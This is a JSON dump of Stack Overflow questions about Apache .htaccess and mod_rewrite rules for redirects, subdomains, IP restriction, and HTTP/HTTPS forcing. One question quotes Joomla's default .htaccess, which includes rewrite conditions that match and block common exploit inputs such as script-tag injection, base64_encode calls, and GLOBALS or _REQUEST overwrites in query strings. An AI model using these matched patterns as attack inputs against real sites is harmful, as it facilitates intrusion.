GETS the data and processes it. If you are having the same problem, paste the code above at the top of your .htaccess file below the opening RewriteEngine On statement.</p>\n\n<p>Hope that helps anyone with the same problem!</p>\n"},{"tags":["php",".htaccess","mod-rewrite","url-rewriting"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12491108,"title":"Apache Rewrite URL, Works in WAMP, not in LAMP","body":"<p>I have a custom MVC app, where in it used <code>IndexController</code> naming convention, which I have built on WAMP. Today i tried it to put in to Linux (LAMP).. Strangely, it is giving error \"page not found\". Can anybody help. I am not good at mod rewrite, </p>\n\n<p>Following is the code</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteRule ^(.*)$ index.php?request=$1 [L,QSA]\n</code></pre>\n\n<p>URL is </p>\n\n<blockquote>\n  <p><code>http://hostname/mvc/incident/add</code></p>\n</blockquote>\n\n<p>Error is  The requested URL /app01/users/public_html/mvc/index.php was not found on this server.</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":50,"score":0,"question_id":12495897,"title":"htaccess rewrite all to index.html","body":"<p>I'm trying to write the <code>.htaccess</code> file so that whatever the user requests, he will have the page <code>index.html</code></p>\n\n<p>I've written this:</p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nRewriteRule .* index.html [NC]\n</code></pre>\n\n<p>I understand that this will cause: whatever the incoming request URL is, i.e, <code>www.domain.com/***</code> (whatever comes after the slash), the result will be the page <code>www.domain.com/index.html</code></p>\n\n<p>However, I'm getting a Server error. What am I missing?</p>\n\n<p>NOTE: I don't want it to be permanent redirect, I'm just trying to \"hide\" the content of my site for a couple of hours with that <code>index.html</code> page (which says that the site is under maintenance).</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect","wildcard-subdomain"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12495508,"title":".htaccess unmasked/forced wildcard subdomain redirect","body":"<p>I want to edit the .htaccess file to create an unmasked wildcard redirect of all subdomains to the main www subdomain.</p>\n\n<p>i.e. *.domain.com => www.domain.com</p>\n\n<p>e.g. www.example.domain.com => www.domain.com</p>\n\n<p>When the person types in www.example.domain.com in the browser address bar, I want it to redirect unmasked so that the URL actually visibly changes to www.domain.com.</p>\n\n<p>My present .htaccess file (shown below) forces the 'www' for all 'without www' traffic, i.e. <code>http://domain.com</code> becomes <code>http://www.domain.com</code>, but can't figure out what RewriteCond etc. commands to use for the above requirement.</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_HOST} ^domain.com$\nRewriteRule ^(.*)$ \"http\\:\\/\\/www\\.domain\\.com\\/$1\" [R=301,L]\n</code></pre>\n\n<p>Any help would be greatly appreciated! Thanks in advance.</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":792,"score":2,"question_id":5657791,"title":"Rewrite all virtual subdomains to same folder using htaccess","body":"<p>I have been searching the internet trying to find a solution to this problem but cannot find a definite solution.</p>\n\n<p>I am trying to <strike>redirect</strike> rewrite </p>\n\n<blockquote>\n  <p>anything.domain.com/anypage.php?sub=anything&amp;including=get_parameters</p>\n</blockquote>\n\n<p>to </p>\n\n<blockquote>\n  <p>domain.com/users/anypage.php?sub=anything&amp;including=get_parameters</p>\n</blockquote>\n\n<hr>\n\n<p>I have found several pages with possible solutions but they all differ slightly to my needs, and editing them continually ends in failure.</p>\n\n<p>Any help would be much appreciated. Thank you.</p>\n\n<p>P.S Wildcard DNS are enabled and everything is set up correctly in apache.</p>\n\n<p><strong>Edit:</strong> </p>\n\n<p>I ended up using the folowing, it seems to work pretty well. Thanks.</p>\n\n<pre><code>RewriteCond %{HTTP_HOST}\n^(.*).domain.com RewriteCond\n%{HTTP_HOST} !^www.domain.com [NC]\nRewriteRule ^(.*)$\nhttp://domain.com/users/$1?sub=%1 [P]\n</code></pre>\n"},{"tags":["regex",".htaccess","http-status-code-301","forward"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":12491410,"title":".htaccess 301 forward regex sytax","body":"<p>need a code block.</p>\n\n<p>look\nmy site www.mysite.com ok.. and my new site www.newsite.com\nmy site searh url : <a href=\"http://www.mysite.com/search.php?key=apple+pie+2+box+59+cent\" rel=\"nofollow\">http://www.mysite.com/search.php?key=apple+pie+2+box+59+cent</a></p>\n\n<p>need a htacces 301 forward code for only forward include apple keyword.</p>\n\n<p>ex : www.mysite.com/search.php?key=apple+pie+2+box+59+cent => www.newsite.com/search.php?key=apple+pie+2+box+59+cent (key include apple ok forw true)</p>\n\n<p>ex : www.mysite.com/search.php?key=banana+and+apple+paste => www.newsite.com/search.php?key=banana+and+apple+paste (key include apple ok forw true)</p>\n\n<p>ex : www.mysite.com/search.php?key=kivi+and+black+berry+juice+cent => www.mysite.com/search.php?key=--NO FORVARD return current site--- (key NOT include apple. no forward false.)</p>\n\n<p>ex : www.mysite.com/search.php?key=one+piece+apple => www.newsite.com/search.php?key=one+piece+apple (key include apple. yes forward true.)</p>\n\n<p>need regxp code.. </p>\n\n<p>exam:\nRewriteRule ^\"only included apple keyword\"/(.+)$ www.newsite.com/search.php?key=$1 [L,R=301]</p>\n\n<p>thx for all helpers. \nsorry my english is bad..</p>\n"},{"tags":["regex",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12493134,"title":"Hyphen in regular expression in htaccess","body":"<p>There is this regexp in htaccess:  </p>\n\n<pre><code>RewriteRule ^collection/([^/_]+)games/$ some.php?coll=$1 [L]  \n</code></pre>\n\n<p>It works fine for url's like \"/collection/somegames/\"<br>\nBut i want the rule to accept these url's: \"/collection/some-games/\" to be redirected to \"some.php?coll=some\"\nI change it to:  </p>\n\n<pre><code>RewriteRule ^collection/([^/_]+)-games/$ some.php?coll=$1 [L]   \n</code></pre>\n\n<p>or  </p>\n\n<pre><code>RewriteRule ^collection/([^/_\\-]+)-games/$ some.php?coll=$1 [L] \n</code></pre>\n\n<p>None of the above helped.<br>\nWhat is the solution?</p>\n"},{"tags":[".htaccess","zend-framework"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12494561,"title":"Zend application without private folder","body":"<p>I have a Zend application hosted in a subdomain zend.example.com, my hosting provider makes a folder \"zend\" inside the public folder for the domain and this can not be changed, so I can access to my zend applicacion folder contents from the main domain, like example.com/application/Bootstrap.php where the \"public\" folder for the zend app would be called \"zend\" in order to comply with the hosting provider,\nIs there a way (maybe with htaccess) that I can prevent access to the application folder contents? Thanks</p>\n"},{"tags":["php","apache",".htaccess","url-rewriting","seo"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12493563,"title":".htaccess File, path is redirected properly but images and css are not loaded","body":"<p>Hi I am using the following lines in my .htaccess file</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine on\nRewriteBase /coaster/CoasterInsider/\n RewriteRule signup$ index.php?page=signup [L,NC]\n RewriteRule login$ index.php?page=loginHandle [L,NC]\n RewriteRule u/(.*)$ index.php?page=profile&amp;username=$1 [L,NC]\n</code></pre>\n\n<p>The path is getting redirected properly, but the css,flash and images are not loading. Also if I use the following '/' after any url say,</p>\n\n<pre><code>RewriteRule signup(/?)$ index.php?page=signup [L,NC]\n</code></pre>\n\n<p>It's not finding any page there, i.e. error 404. I just want my htaccess file to work for both /signup and /signup/</p>\n"},{"tags":["php",".htaccess","web-security"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":119,"score":4,"question_id":12479763,"title":"only allow PHP scripts to open urls like www.mydomain.com/topsecret/1/001.jpg","body":"<p>I run a web app where I store the users' uploaded files in a folder structure like: </p>\n\n<pre><code>www.mydomain.com/uploads/topsecret/1/001.jpg\nwww.mydomain.com/uploads/topsecret/1/002.jpg\n</code></pre>\n\n<p>Now, it's very easy to guess the urls for 003.jpg and 004.jpg ...</p>\n\n<p>Therefore, I want to restrict user access to only www.mydomain.com/app/, and nothing else. \nOnly my .php pages on localhost should be allowed to get to the top secret pdfs, like </p>\n\n<pre><code>show.php:\n&lt;? if ($isAdmin) {\n    echo \"&lt;img src='http://www.mydomain.com/uploads/topsecret/1/001.jpg'/&gt;\";\n } ?&gt;\n</code></pre>\n\n<p>Maybe there is a solution via .htaccess or via folder permissions. I know I could fix the problem via \"headers\" and \"readfile\", but that would cause a bit of refactoring now. </p>\n\n<p>Thank you in advance, \nMatthias</p>\n"},{"tags":["apache",".htaccess","redirect","rewrite"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12491901,"title":"How do I redirect if a PDF is requested from a given directory with .htaccess?","body":"<p>I have a bunch of PDFS in: /uploads/dashboard/</p>\n\n<p>What I'd like to do is, if a PDF is requested from this directory, redirect to a script which checks if the user's current session allows them to access the PDF. If the user is allowed, the script serves the PDF.</p>\n\n<p>Here's where I am:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI}/dashboard \\.(pdf)$ [NC]   # If filename ends with .pdf and is in the 'dashboard' directory\nRewriteRule ^(.*)$ dl/$1 [L,R]              # Redirect the user to the auth script\n</code></pre>\n\n<p>However, I keep getting a 404 error with the current code.</p>\n\n<p>This is a Zend Framework application with PHP 5.3 Below are the full contents of my .htaccess:</p>\n\n<pre><code>php_flag magic_quotes_gpc Off\n\nSetEnv APPLICATION_ENV development\n\nRewriteEngine On\n\n# Force trailing slash\nRewriteCond %{REQUEST_URI}/dashboard \\.(pdf)$ [NC]    # If filename ends with .pdf or .cdr\nRewriteRule ^(.*)$ dl/$1 [L,R]              # Redirect the user to the other site\n\nRewriteCond %{REQUEST_URI} !.(jpe?g|gif|png|js|css|swf|flv)$ [NC]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_METHOD} !=POST\nRewriteCond %{REQUEST_URI} !(.*)/$\nRewriteRule ^(.*)$ %{REQUEST_URI}/ [L,R=301]\n\nRewriteCond %{REQUEST_URI} .(jpe?g|gif|png|js|css|swf|flv)$ [NC,OR]\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\n</code></pre>\n\n<p>How might I achieve this?</p>\n\n<p>Many thanks</p>\n"},{"tags":["php","wordpress","security",".htaccess"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12491615,"title":"Logging out a user from wordpress and preventing BACK button","body":"<p>Can something be done to prevent a user from using the back button when <code>wp_logout_url</code> is called? Sure, it logs the user out but they can still see pre-rendered HTML on the page if they press back. Being sensitive data, what can be done?</p>\n\n<p>I have come up with a variety of workarounds that don't answer it, from trying to close the window to redirecting to a different url etc. </p>\n\n<p>Does anyone know how I can prevent a user from pressing BACK, or an elegant hack to stop this?</p>\n\n<p>I need something that checks if the user is logged in, similar to how if you logout in facebook, you can't click back</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12486748,"title":"How to redirect using .htaccess in apache?","body":"<p>I am trying to create a user management system where users can register another users using  their pre-created user links such as http www .abc .co. uk/access/register.php?id=username [sorry not allowing to put more links]</p>\n\n<p>but I want the long link to be like this:</p>\n\n<p><a href=\"http://www.abc.co.uk/username\" rel=\"nofollow\">http://www.abc.co.uk/username</a></p>\n\n<p>and when users type the short url it will re-direct to <a href=\"http://www.abc.co.uk/access/register.php?id=username\" rel=\"nofollow\">http://www.abc.co.uk/access/register.php?id=username</a></p>\n\n<p>Below are the codes in my .htaccess file at the moment as I am also running a wordpress in the same domain. </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n\nOptions +FollowSymLinks\nRewriteEngine on\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(\\w+)$ ./access/register.php?id=$1 [L,QSA]\n</code></pre>\n\n<p>Can the .htaccess additional codes that I have added for the username redirect be used along with other wordpress redirect in the same .htaccess file?</p>\n\n<p>When I type the short url in the browser it takes me to a \"page not found\" page.</p>\n\n<p>I have tried several ways and the above codes does not work. Could anyone please help me? Thanks\nJay</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":33,"score":1,"question_id":12489463,"title":"htaccess ModRewrite URLs to pull contents from Index.php file, leaving URL as is","body":"<p>I am trying to run a mod_rewrite rule to load the contents of index.php regardless of the entered URL.\nThen in the index.php file I will deal with either returning a correct page or outputting a 404 page.\nThis is for SEO purposes to allow a nice URL like:\n<a href=\"http://www.example.com/product\" rel=\"nofollow\">http://www.example.com/product</a>\nrather than\n<a href=\"http://www.example.com/?p=product\" rel=\"nofollow\">http://www.example.com/?p=product</a></p>\n\n<p>I have this working on one sub folder of my blog but when trying to test it on a new project all i get is 500 errors as for ALL urls.</p>\n\n<p>Here is the existing htaccess:</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /products/\nRewriteCond %{HTTP_HOST} ^www.danclarkie.co.uk/products [NC]\nRewriteRule ^(.*)$ http://danclarkie.co.uk/products/$1 [L,R=301]\nRewriteCond %{REQUEST_URI} !/admin.php$\nRewriteRule .* index.php\n</code></pre>\n\n<p>Any help ^_^</p>\n\n<p>Dan</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12479921,"title":"HTACCESS IP Restriction for all items of a directory","body":"<p>I'm using Joomla , and using a htaccess in administrator directory for restrict access via IP Address , htaccess is here <code>site.com/administrator/.htaccess</code>  </p>\n\n<p><em><strong>Problem:</em></strong><br>\nhtaccess work and restrict access with IP Address , but just work on sub-directories .<br>\nfor example <code>site.com/administrator/index.php</code> can be access too from not included IP Address and restrict just work on sub-directories <code>site.co../admi.../includes</code> can't be access on public IP Address (not included in htaccess) .<br>\nhow can I set it to restrict all items of this directories (adminisitrator dir with all sub-dir) ?</p>\n\n<p><em><strong>My htaccess :</em></strong>  </p>\n\n<pre><code>AuthName \"Access Restrict\"\nAuthType Basic \n&lt;Limit GET POST&gt;\norder deny,allow\ndeny from all\nallow from 46.36.45.1.\n&lt;/Limit&gt;\n</code></pre>\n\n<p><em><strong>my root htaccess</em></strong>:</p>\n\n<pre><code>##\n# @version $Id: htaccess.txt 21064 2011-04-03 22:12:19Z dextercowley $\n# @package Joomla\n# @copyright Copyright (C) 2005 - 2010 Open Source Matters. All rights reserved.\n# @license http://www.gnu.org/copyleft/gpl.html GNU/GPL\n# Joomla! is Free Software\n##\n\n\n#####################################################\n#  READ THIS COMPLETELY IF YOU CHOOSE TO USE THIS FILE\n#\n# The line just below this section: 'Options +FollowSymLinks' may cause problems\n# with some server configurations.  It is required for use of mod_rewrite, but may already\n# be set by your server administrator in a way that dissallows changing it in\n# your .htaccess file.  If using it causes your server to error out, comment it out (add # to\n# beginning of line), reload your site in your browser and test your sef url's.  If they work,\n# it has been set by your server administrator and you do not need it set here.\n#\n#####################################################\n\n##  Can be commented out if causes errors, see notes above.\nOptions +FollowSymLinks\n\n#\n#  mod_rewrite in use\n\nRewriteEngine On\n\n########## Begin - Rewrite rules to block out some common exploits\n## If you experience problems on your site block out the operations listed below\n## This attempts to block the most common type of exploit `attempts` to Joomla!\n#\n## Deny access to extension xml files (uncomment out to activate)\n#&lt;Files ~ \"\\.xml$\"&gt;\n#Order allow,deny\n#Deny from all\n#Satisfy all\n#&lt;/Files&gt;\n## End of deny access to extension xml files\n# Block out any script trying to set a mosConfig value through the URL\nRewriteCond %{QUERY_STRING} mosConfig_[a-zA-Z_]{1,21}(=|\\%3D) [OR]\n# Block out any script trying to base64_encode data within the URL\nRewriteCond %{QUERY_STRING} base64_encode[^(]*\\([^)]*\\) [OR]\n# Block out any script that includes a &lt;script&gt; tag in URL\nRewriteCond %{QUERY_STRING} (&lt;|%3C)([^s]*s)+cript.*(&gt;|%3E) [NC,OR]\n# Block out any script trying to set a PHP GLOBALS variable via URL\nRewriteCond %{QUERY_STRING} GLOBALS(=|\\[|\\%[0-9A-Z]{0,2}) [OR]\n# Block out any script trying to modify a _REQUEST variable via URL\nRewriteCond %{QUERY_STRING} _REQUEST(=|\\[|\\%[0-9A-Z]{0,2})\n# Return 403 Forbidden header and show the content of the root homepage\nRewriteRule .* index.php [F]\n#\n########## End - Rewrite rules to block out some common exploits\n\n\n########## Begin - Custom redirects\n#\n# If you need to redirect some pages, or set a canonical non-www to\n# www redirect (or vice versa), place that code here. Ensure those\n# redirects use the correct RewriteRule syntax and the [R=301,L] flags.\n#\n########## End - Custom redirects\n\n\n#  Uncomment following line if your webserver's URL\n#  is not directly related to physical file paths.\n#  Update Your Joomla! Directory (just / for root)\n\n# RewriteBase /\n\n\n########## Begin - Joomla! core SEF Section\n#\nRewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]\n#\n# If the requested path and file is not /index.php and the request\n# has not already been internally rewritten to the index.php script\nRewriteCond %{REQUEST_URI} !^/index\\.php\n# and the request is for root, or for an extensionless URL, or the\n# requested URL ends with one of the listed extensions\nRewriteCond %{REQUEST_URI} (/[^.]*|\\.(php|html?|feed|pdf|raw))$ [NC]\n# and the requested path and file doesn't directly match a physical file\nRewriteCond %{REQUEST_FILENAME} !-f\n# and the requested path and file doesn't directly match a physical folder\nRewriteCond %{REQUEST_FILENAME} !-d\n# internally rewrite the request to the index.php script\nRewriteRule .* index.php [L]\n#\n########## End - Joomla! core SEF Section\n\nenter code here\n</code></pre>\n"},{"tags":[".htaccess","http-status-code-410"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":452,"score":1,"question_id":8549172,"title":"I would like to 410 an entire directory - I deleted my blog","body":"<p>I had a folder called blog on my site.\nI deleted it all permanently.\nI would like to 410 it.\nHow do i 410 an entire folder?</p>\n\n<p>e.g. my site looked like this</p>\n\n<pre><code>example.com/blog/mycoolpost1/\nexample.com/blog/mycoolpost2/\nexample.com/blog/mycoolpost3/\nexample.com/blog/mycoolpost4/\n</code></pre>\n\n<p>now posts 1,2,3,4, are dead.</p>\n\n<p>so how do i specify that everything after blog, is permanently deleted. (as well as the folder 'blog' itself)</p>\n\n<p>I need a htaccess line something like this...?</p>\n\n<p>redirect 410 /blog/?(.*)</p>\n"},{"tags":["wordpress",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12490330,"title":"htaccess conditional redirect","body":"<p>I have by google indexed couple of tags as it follows <code>domain.com/tag-name</code>. Because of incompatibilities between my wordpress plugins this structure had to be changed to <code>domain.com/tag/tag-name</code>, on the other side all my posts are having almost the same structure as the indexed tag url <code>domain.com/pots-name</code>. Is there a way to create a a conditional pattern with htaccess to redirect <code>domain.com/tag-name</code> to <code>domain.com/tag/tag-name</code> if the the http response is 404?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":93,"score":1,"question_id":12488121,"title":"Getting PROPFIND in apache access logs","body":"<p>I am getting lots of request in my apache access log file as follows:</p>\n\n<pre><code>50.80.29.105 - - [19/Sep/2012:07:32:31] \"PROPFIND /images/logos/puzzles.gif HTTP/1.1\" 501 5014\n</code></pre>\n\n<p>Because of this error is getting generated on my server; and log files are getting filled up with exceptions. Is there a way to avoid this ? Probably put it in robots.txt ! </p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12489818,"title":".HTACCESS URL Rewriting - 404 Error in My URL","body":"<p>I am trying for URL rewriting and using below mentioned code. But I am receiving 404 Error on my pages except one given below.</p>\n\n<pre><code>   Options +FollowSymLinks\n   RewriteEngine on\n\n   rewritecond %{http_host} ^phoolwala.net [nc]\n   rewriterule ^(.*)$ http://www.phoolwala.net/$1 [r=301,nc]\n   #RewriteRule ^index.php?$ /phoolwala.net/? [R=301] \n   RewriteRule ^index.php?$ /? [R=301] \n   RewriteCond %{REQUEST_FILENAME} !-f\n   RewriteCond %{REQUEST_FILENAME} !-d\n\n    #below line gives error in dhtml editor\n    #RewriteRule ^(.*)\\.html$ $1.php [nc]\n\n    #RewriteRule ^(.*)/$             $1.php [L]\n\n\n    RewriteRule ^register/$ register.php [L]\n    RewriteRule ^register$ register.php [L]\n\n\n    RewriteRule ^my-account/$ my-account.php [L]\n    RewriteRule ^my-account$ my-account.php [L]\n\n    RewriteRule ^track-order/$ track-order.php [L]\n    RewriteRule ^track-order$ track-order.php [L]\n\n    RewriteRule ^edit-profile/$ edit-profile.php [L]\n    RewriteRule ^edit-profile$ edit-profile.php [L]\n\n    RewriteRule ^testimonials/$ testimonials.php [L]\n    RewriteRule ^testimonials$ testimonials.php [L]\n\n    RewriteRule ^sitemap/$ sitemap.php [L]\n    RewriteRule ^sitemap$ sitemap.php [L]\n\n    RewriteRule ^login/$ login.php [L]\n    RewriteRule ^login$ login.php [L]\n\n    RewriteRule ^my-account/$ my-account.php [L]\n    RewriteRule ^my-account$ my-account.php [L]\n\n    RewriteRule ^edit-profile/$ edit-profile.php [L]\n    RewriteRule ^edit-profile$ edit-profile.php [L]\n\n    RewriteRule ^reminders/$ reminders.php [L]\n    RewriteRule ^reminders$ reminders.php [L]\n\n    RewriteRule ^view-my-orders/$ view-my-orders.php [L]\n    RewriteRule ^view-my-orders$ view-my-orders.php [L]\n\n    RewriteRule ^order-details/$ order-details.php [L]\n    RewriteRule ^order-details$ order-details.php [L]\n\n    RewriteRule ^contact-us/$ contact-us.php [L]\n    RewriteRule ^contact-us$ contact-us.php [L]\n\n    RewriteRule ^logout/$ logout.php [L]\n    RewriteRule ^logout$ logout.php [L]\n\n    RewriteRule ^cart/$ cart.php [L]\n    RewriteRule ^cart$ cart.php [L]\n\n\n     RewriteRule ^international-products/(.*)/(.*)/(.*)/ international-products.php?cid=$1&amp;id=$2&amp;pageno=$3 [L]\n     RewriteRule ^international-products/(.*)/(.*)(.*)/ international-products.php?cid=$1&amp;id=$2&amp;pageno=$3 [L]\n\n    RewriteRule ^products/(.*)/(.*)/ products.php?id=$1&amp;pageno=$2 [L]\n    RewriteRule ^products/(.*)/(.*) products.php?id=$1&amp;pageno=$2 [L]\n\n    RewriteRule ^price/(.*)/(.*)/(.*)/ productsprice.php?from=$1&amp;to=$2&amp;pageno=$3 [L]\n    RewriteRule ^price/(.*)/(.*)(.*)/ productsprice.php?from=$1&amp;to=$2&amp;pageno=$3 [L]\n\n    RewriteRule ^page/(.*)/(.*)/ page.php?alias=$1&amp;id=$2 [L]\n    RewriteRule ^page/(.*)/(.*) page.php?alias=$1&amp;id=$2 [L]\n\n    RewriteRule ^international-product/(.*)/(.*)/(.*)/ international-product-details.php?cid=$1&amp;cat=$2&amp;id=$3 [L]\n    RewriteRule ^international-product/(.*)/(.*)/(.*) international-product-details.php?cid=$1&amp;cat=$2&amp;id=$3 [L]\n\n    RewriteRule ^product/(.*)/(.*)/(.*)/ product-details.php?cat=$1&amp;alias=$2&amp;id=$3 [L]\n    RewriteRule ^product/(.*)/(.*)/(.*) product-details.php?cat=$1&amp;alias=$2&amp;id=$3 [L]\n\n    RewriteRule ^search/(.*)/(.*)/(.*)/ productsearch.php?keyword=$1&amp;cat=$2&amp;pageno=$3 [L]\n    RewriteRule ^search/(.*)/(.*)(.*)/ productsearch.php?keyword=$1&amp;cat=$2&amp;pageno=$3 [L]\n\n    RewriteRule ^international/(.*)/ international.php?cid=$1 [L]\n    RewriteRule ^international/(.*) international.php?cid=$1 [L]\n</code></pre>\n\n<p>But except below code nothing is working please help me to update the code.</p>\n\n<pre><code>  RewriteRule ^product/(.*)/(.*)/(.*)/ product-details.php?cat=$1&amp;alias=$2&amp;id=$3 [L]\n  RewriteRule ^product/(.*)/(.*)/(.*) product-details.php?cat=$1&amp;alias=$2&amp;id=$3 [L]\n</code></pre>\n"},{"tags":["html","wordpress","http",".htaccess","https"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":252,"score":-1,"question_id":10356019,"title":"How to force http- NOT https using htaccess","body":"<p>I have ONE directory for my entire domain that I want to force https, which is \"/docs\". In the /docs folder, I have the following htaccess file:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTPS} !=on\nRewriteRule ^ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]\n</code></pre>\n\n<p>This is forcing https to everything in the /docs directory, which is what I want it to do. The problem I am having is trying to force REMOVE https back to http for all other areas of my site. In the root folder of the site (which is running wordpress), I have the following htaccess file:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n\nRewriteCond %{HTTPS} on\nRewriteCond %{REQUEST_URI} !^/docs/?.*$\nRewriteRule ^(.*)$ http://www.mydomain.com/$1 [R=301,L]\n</code></pre>\n\n<p>Unfortunately, this is not working. I can still access other areas of my site over https.</p>\n\n<p>What do I need to change to get this to work correctly?</p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12485941,"title":".htaccess to redirect index.* and rewrite the url into a query string","body":"<p>I am currently trying to use two rewrite rules in the .htaccess file in the /sub/ folder of my website. One is a redirect to remove the index.php, index.html, etc. at the end of the url e.g. /sub/index.php -> /sub/:</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} ^(.*)/index\\.[^\\.]+$\nRewriteRule index.* %1/ [r=301,L]\n</code></pre>\n\n<p>The other is to rewrite the url for php to get the query string e.g. /sub/testing-testing -> /sub/index.php?field=testing-testing:</p>\n\n<pre><code>RewriteRule ^(.*)$ index.php?command_name=$1 [L,QSA]\n</code></pre>\n\n<p>These seem to work without a problem on their own but I just can't figure out how to get them to work together.</p>\n\n<p>I can see how it might be going wrong with the second rule because the first one is matching \"index(...)\" so I've tried different variations of these but I keep ending up with either endless redirect loops or being redirected back into the root of the website.</p>\n"},{"tags":["php",".htaccess","url-rewriting","drupal-6"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":64,"score":2,"question_id":12400283,"title":"How to add a word after my root URL for every request?","body":"<p>Consider</p>\n\n<pre><code>http://localhost/MyProject/\n</code></pre>\n\n<p>This is the root url</p>\n\n<p>When accessing this i want to alter the url to </p>\n\n<pre><code>http://localhost/MyProject/Apps/\n</code></pre>\n\n<p>The url should look like above but should execute</p>\n\n<pre><code>http://localhost/MyProject/index.php\n</code></pre>\n\n<p>That is i just want to add the word 'Apps' to the url. There is no folder named 'Apps'...</p>\n"},{"tags":["zend-framework",".htaccess","web-deployment"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":593,"score":0,"question_id":10194661,"title":"Redirect request to public directory zend","body":"<p>I have a sub domain to which i have deployed my zend application, the problem is it points to the directory say <code>abc</code> and i cannot get it changed to point it to <code>public</code> directory is there a way i can put a <code>.htaccess</code> file on the root which will redirect to the <code>public</code> directory? can it be done? is there another way i can get it done</p>\n\n<p>my index.php inside public dir</p>\n\n<pre><code>&lt;?php\n\n// Define path to application directory\ndefined('APPLICATION_PATH')\n    || define('APPLICATION_PATH', realpath(dirname(__FILE__) . '/../application'));\n\n// Define application environment\ndefined('APPLICATION_ENV')\n    || define('APPLICATION_ENV', (getenv('APPLICATION_ENV') ? getenv('APPLICATION_ENV') : 'production'));\n\n// Ensure library/ is on include_path\nset_include_path(implode(PATH_SEPARATOR, array(\n    realpath(APPLICATION_PATH . '/../library'),\n    get_include_path(),\n)));\n\n/** Zend_Application */\nrequire_once 'Zend/Application.php';\n\n\n\n// Create application, bootstrap, and run\n$application = new Zend_Application(\n    APPLICATION_ENV,\n    APPLICATION_PATH . '/configs/application.ini'\n);\n$application-&gt;bootstrap()\n            -&gt;run();\n</code></pre>\n\n<p>my <code>.htaccess</code> inside public dir</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^.*$ - [NC,L]\nRewriteRule ^.*$ index.php [NC,L]\n</code></pre>\n\n<p>currently the directory structure looks like </p>\n\n<pre><code>/myroot\n -.settings\n -application\n -docs\n -library\n -public\n -tests\n -.buildpath\n -.proect\n -.zfproject.xml\n</code></pre>\n"},{"tags":["php","wordpress",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":45,"score":2,"question_id":12444862,"title":"wordpress new instance redirecting wp-admin to old 